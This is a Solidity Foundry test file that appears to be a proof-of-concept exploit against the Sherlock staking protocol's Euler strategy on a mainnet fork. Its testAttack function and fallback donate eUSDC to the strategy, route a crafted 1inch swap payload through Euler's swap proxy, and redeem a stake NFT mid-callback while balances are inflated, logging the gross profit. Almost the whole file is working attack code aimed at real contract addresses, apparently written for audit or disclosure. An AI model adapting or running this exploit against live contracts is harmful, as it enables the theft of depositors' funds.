// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
// import { IVault } from "src/interfaces/IVault.sol";
import { Minter } from "./Minter.sol";
import { SafeTransferLib } from "solmate/utils/SafeTransferLib.sol";
import { ERC20 } from "solmate/tokens/ERC20.sol";
import { ISherlockStake } from "./ISherlockStake.sol";
import { ERC721TokenReceiver } from "solmate/tokens/ERC721.sol";

import { EulerLike, ETokenLike, DTokenLike, MarketsLike} from "./EulerInterfaces.sol";

contract OneInchSwapUtils {
 uint256 private constant _SHOULD_CLAIM = 0x04;

    struct SwapDescription {
            address srcToken;
            address dstToken;
            address srcReceiver;
            address dstReceiver;
            uint256 amount;
            uint256 minReturnAmount;
            uint256 flags;
            bytes permit;
        }
    function generatePayload(address srcToken, address dstToken, address receiver, uint256 balance) internal view returns(bytes memory payload) {

        SwapDescription memory description = SwapDescription(
            srcToken, dstToken, address(this), receiver, balance,
            1, // minreturn
            _SHOULD_CLAIM, ""
        );
        payload = abi.encodeWithSelector(0x7c025200, address(this), description, abi.encode(balance, balance, balance));
    }
}

// forge test --fork-url https://eth-mainnet.g.alchemy.com/v2/ --fork-block-number 15140970 -vvv
contract SherlockTest is Test, Minter, ERC721TokenReceiver, OneInchSwapUtils{

    using SafeTransferLib for ERC20;

    address sherlock = 0x0865a889183039689034dA55c1Fd12aF5083eabF;
    uint256 mintAmount = 15_000_000 * 10 ** 6; // Amount of USDC to mint in total
    uint256 donateAmount =  10_000_000 * 10 ** 6; // Amount of the minted USDC will be donated to the EulerStrategy
    uint256 flashloanAmount = 990_000_000 * 10 ** 6; // Amount of USDC to flashloan
    uint256 period = 15724800; // 6 months

    address eulerStrategy = 0xC124A8088c39625f125655152A168baA86b49026;

    address EULER_MAINNET_MARKETS = 0x3520d5a913427E6F0D6A83E07ccD4A4da316e4d3;
    address SWAP_PROXY = 0x7123C8cBBD76c5C7fCC9f7150f23179bec0bA341;
    address euler = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address oneInchAddress = 0x1111111254fb6c44bAC0beD2854e76F90643097d;


    address sherlockProtocolManager = 0x3d0b8A0A10835Ab9b0f0BeB54C5400B8aAcaa1D3;
    // GLOBAL STATE for fallback;
    uint256 PUMPAMOUNT;
    uint256 NFTID;

    function setUp() public {
        mintUsdc(address(this), mintAmount);
        mintUsdc(sherlockProtocolManager, 1000000 * 10**6); // mint tokens for the premium <- there's should be enough liquidity when there's time to redeem
        WETH.call{value: 10000 ether}("");
    }

    function depositEuler(address collateral, uint256 amount) internal {
        // IEulerMarkets markets = IEulerMarkets(EULER_MAINNET_MARKETS);
        MarketsLike markets = MarketsLike(EULER_MAINNET_MARKETS);
        // Approve, get eToken addr, and deposit:
        ERC20(collateral).approve(euler, type(uint).max);
        ETokenLike collateralEToken = ETokenLike(markets.underlyingToEToken(collateral));
        collateralEToken.deposit(0, amount);
    }

    function swap(address srcToken, address receiveToken, uint256 amount) internal {
        EulerLike.Swap1InchParams memory params = EulerLike.Swap1InchParams(
            0, 0, // set subaccountId 0
            srcToken, receiveToken,
            amount, 1, generatePayload(srcToken, receiveToken, address(this), amount)
        );
        EulerLike(SWAP_PROXY).swap1Inch(params);
    }

    function testAttack() public {
        ERC20(usdc).approve(sherlock, mintAmount);


        MarketsLike markets = MarketsLike(EULER_MAINNET_MARKETS);
        uint256 ethDeposit = 1 ether;
        uint256 usdcAmount = 10e6;
        uint256 pumpAmount = flashloanAmount /2;
        mintUsdc(address(this), pumpAmount * 2 + usdcAmount); // need pumpamount * 2;

        uint256 preAttack = ERC20(usdc).balanceOf(address(this));
        console.log("pre attack:", preAttack);
        (uint id, uint shares) = ISherlockStake(sherlock).initialStake(mintAmount-donateAmount, period, address(this));

        NFTID = id;

        vm.warp(block.timestamp + period + 10);
        vm.roll(block.number + 1);
        {
            depositEuler(usdc, donateAmount);
            ERC20 eUSDC = ERC20(markets.underlyingToEToken(usdc));
            console.log("prepump eUSDC:", eUSDC.balanceOf(address(this)));
            eUSDC.transfer(eulerStrategy, eUSDC.balanceOf(address(this)));
        }
        {
            uint256 usdcAmount = 10**6;
            depositEuler(WETH, ethDeposit);
            depositEuler(usdc, usdcAmount);
            ETokenLike collateralEToken = ETokenLike(markets.underlyingToEToken(usdc));
            console.log("eusdc after deposit", ERC20(address(collateralEToken)).balanceOf(address(this)));

            PUMPAMOUNT = pumpAmount;
            console.log("beforeSwap");
            swap(WETH, usdc, ethDeposit / 2);
            console.log("eusdc after swap", ERC20(address(collateralEToken)).balanceOf(address(this)));

        }
        console.log("after swap:", ERC20(usdc).balanceOf(address(this)));
        console.log("1inch after swap", ERC20(usdc).balanceOf(oneInchAddress));

        {
            ETokenLike collateralEToken = ETokenLike(markets.underlyingToEToken(WETH));
            uint256 underlying = collateralEToken.balanceOfUnderlying(address(this));
            collateralEToken.withdraw(0, underlying);
            console.log("after withdraw weth", underlying);


            collateralEToken = ETokenLike(markets.underlyingToEToken(usdc));
            console.log("eusdc", ERC20(address(collateralEToken)).balanceOf(address(this)));
            underlying = collateralEToken.balanceOfUnderlying(address(this));
            collateralEToken.withdraw(0, underlying);
            console.log("after withdraw usdc", underlying);

            // withdraw
        }

        console.log("after withdraw:", ERC20(usdc).balanceOf(address(this)));
        {
            uint256 postAttack = ERC20(usdc).balanceOf(address(this));
            console.log("post attack:", postAttack);
            console.log("gross profit:", postAttack - preAttack);
            // assuming 0.09% flash loan cost
            console.log("flash loan costs:", (flashloanAmount / 10_000) * 9);
        }

    }


    fallback() external payable {
        require(msg.sender == oneInchAddress);

        MarketsLike markets = MarketsLike(EULER_MAINNET_MARKETS);
        ETokenLike collateralEToken = ETokenLike(markets.underlyingToEToken(usdc));



        uint256 underlyingAmount = collateralEToken.balanceOfUnderlying(eulerStrategy);

        console.log("underlyingAmount:", underlyingAmount);
        console.log("before pump:", ERC20(usdc).balanceOf(address(this)));

       // ETokenLike collateralEToken = ETokenLike(markets.underlyingToEToken(usdc));
        console.log("eusdc before pump ", ERC20(address(collateralEToken)).balanceOf(address(this)));
        ERC20(usdc).transfer(euler, PUMPAMOUNT);
        console.log("eusdc after pump ", ERC20(address(collateralEToken)).balanceOf(address(this)));

        console.log("1inch before pump", ERC20(usdc).balanceOf(oneInchAddress));
        ERC20(usdc).transfer(oneInchAddress, PUMPAMOUNT);
        console.log("1inch after pump", ERC20(usdc).balanceOf(oneInchAddress));

        console.log("after pump:", ERC20(usdc).balanceOf(address(this)));



        underlyingAmount = collateralEToken.balanceOfUnderlying(eulerStrategy);
        console.log("manipulated underlyingAmount:", underlyingAmount);
        // design for 1inch callback
        uint256 amount = ISherlockStake(sherlock).redeemNFT(NFTID);
        console.log("withdrawamount:", amount);

        console.log("after redeem:", ERC20(usdc).balanceOf(address(this)));

    }

}